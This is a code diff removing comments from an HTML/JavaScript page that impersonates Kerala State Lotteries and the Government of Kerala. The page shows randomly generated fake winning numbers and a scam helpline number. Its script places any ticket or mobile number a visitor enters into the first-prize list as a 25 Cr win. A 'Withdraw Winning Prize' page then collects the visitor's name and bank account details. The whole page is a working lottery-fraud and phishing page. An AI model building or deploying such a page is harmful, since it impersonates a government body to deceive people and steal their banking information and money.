@@ -26,7 +26,6 @@
       max-width: 480px;
       margin: 10px auto 40px auto;
     }
-    /* Helpline Header */
     .helpline-bar {
       background: #dc2626;
       color: #fff;
@@ -39,8 +38,6 @@
       box-shadow: 0 4px 12px rgba(220, 38, 38, 0.4);
     }
     .helpline-bar a { color: #fff; text-decoration: none; }
-    
-    /* Card Container */
     .card {
       background: #ffffff;
       padding: 22px 18px;
@@ -48,8 +45,6 @@
       box-shadow: 0 12px 30px rgba(0,0,0,0.25);
       position: relative;
     }
-    
-    /* Kerala Lottery Poster */
     .banner {
       background: linear-gradient(135deg, #f59e0b, #d97706);
       border-radius: 12px;
@@ -62,8 +57,6 @@
     .banner h1 { font-size: 20px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
     .banner p { font-size: 13px; font-weight: 600; margin-top: 4px; color: #fef3c7; }
     .banner .bumper { font-size: 18px; font-weight: 900; color: #fff; margin-top: 6px; text-shadow: 1px 1px 3px rgba(0,0,0,0.4); }
-
-    /* Search Box */
     .search-box { margin-bottom: 15px; }
     input {
       width: 100%;
@@ -90,8 +83,6 @@
       background: linear-gradient(90deg, #16a34a, #15803d);
       margin-top: 15px;
     }
-
-    /* Result Panel */
     .result-view {
       background: #eff6ff;
       border: 2px solid #bfdbfe;
@@ -102,8 +93,6 @@
     }
     .result-view h3 { color: #1e3a8a; font-size: 17px; margin-bottom: 10px; border-bottom: 1px solid #dbeafe; padding-bottom: 6px; }
     .result-view p { font-size: 14px; margin: 6px 0; color: #334155; }
-
-    /* Winners Accordion/Table */
     .winners-box {
       margin-top: 20px;
       background: #f8fafc;
@@ -135,7 +124,6 @@
       border-radius: 5px;
       font-family: monospace;
     }
-    /* Highlight Winner Tag */
     .ultra-lite-winner {
       background: linear-gradient(90deg, #facc15, #f59e0b) !important;
       color: #000 !important;
@@ -146,8 +134,6 @@
       animation: pulse 1.5s infinite;
     }
     @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
-
-    /* Withdraw Form Modal Page */
     #withdrawPage {
       display: none;
       background: #ffffff;
@@ -169,41 +155,34 @@
 <body>
 
 <div class="wrapper">
-  <!-- Helpline Bar -->
   <div class="helpline-bar">
     📞 Customer Care Helpline: <a href="tel:8709171965">+91 8709171965</a>
   </div>
 
-  <!-- MAIN SEARCH CARD -->
   <div class="card" id="mainCard">
-    <!-- Kerala Poster -->
     <div class="banner">
       <h1>Kerala State Lotteries</h1>
       <p>Directorate of State Lotteries, Government of Kerala</p>
       <div class="bumper">★ BUMPER DHAMAKA RESULTS ★</div>
     </div>
 
-    <!-- Search Input -->
     <div class="search-box">
       <input type="text" id="searchKey" placeholder="Apna Ticket No ya Mobile No dalein (e.g. KL 868988)">
       <button class="btn-main" onclick="checkResult()">Check Result</button>
     </div>
 
-    <!-- Live Status / Result Panel -->
     <div class="result-view" id="resultBox">
       <h3>Lottery Result Panel</h3>
       <div id="resultContent"></div>
       <button class="btn-main btn-withdraw" onclick="openWithdrawPage()">Withdraw Winning Prize</button>
     </div>
 
-    <!-- Live Random Winners Section -->
     <div class="winners-box">
       <h4>Official Winning Numbers</h4>
       <div id="winnersList">Loading prize results...</div>
     </div>
   </div>
 
-  <!-- WITHDRAW DETAILS PAGE -->
   <div id="withdrawPage">
     <h2 style="font-size: 19px; color: #1e3a8a; margin-bottom: 12px; text-align:center;">Bank Account Verification & Withdraw</h2>
     <div style="background: #f1f5f9; padding: 12px; border-radius: 8px; margin-bottom: 15px; font-size: 14px;">
@@ -239,7 +218,6 @@
   let matchedTicket = null;
   let prizeSummary = { amount: "0", ticket: "" };
 
-  // Prize configuration
   const prizeSlabs = [
     { rank: "1st Prize", amount: "25 Cr", count: 1 },
     { rank: "2nd Prize", amount: "10 Cr", count: 1 },
@@ -253,13 +231,11 @@
     { rank: "10th Prize", amount: "2,500", count: 200 }
   ];
 
-  // Random Ticket Generator
   function generateTicket() {
     const num = Math.floor(100000 + Math.random() * 900000);
     return `KL-${num}`;
   }
 
-  // Pre-generate static list of winners
   const generatedWinners = prizeSlabs.map(slab => {
     const tickets = [];
     for (let i = 0; i < slab.count; i++) {
@@ -299,7 +275,6 @@
 
   renderWinners();
 
-  // Search Logic with SheetDB
   async function checkResult() {
     const rawInput = document.getElementById("searchKey").value.trim();
     const resultBox = document.getElementById("resultBox");
@@ -331,7 +306,6 @@
           ticket: matchedTicket
         };
 
-        // Inject ticket in 1st prize list as ultra lite star winner
         if (generatedWinners[0] && !generatedWinners[0].tickets.includes(matchedTicket)) {
           generatedWinners[0].tickets[0] = matchedTicket;
         }
@@ -353,7 +327,6 @@
     }
   }
 
-  // Open Withdraw Page
   function openWithdrawPage() {
     document.getElementById("mainCard").style.display = "none";
     document.getElementById("withdrawPage").style.display = "block";
@@ -361,13 +334,11 @@
     document.getElementById("claimTicket").innerText = prizeSummary.ticket || "KL 868988";
   }
 
-  // Back to Main Card
   function backToMain() {
     document.getElementById("withdrawPage").style.display = "none";
     document.getElementById("mainCard").style.display = "block";
   }
 
-  // Mask Account Number (Last 4 Digits Visible)
   function updateMaskedAcc(val) {
     const clean = val.replace(/\s+/g, '');
     if (clean.length > 4) {
@@ -380,7 +351,6 @@
     }
   }
 
-  // Handle Form Submission
   function handleFormSubmit(e) {
     e.preventDefault();
     const name = document.getElementById("custName").value;
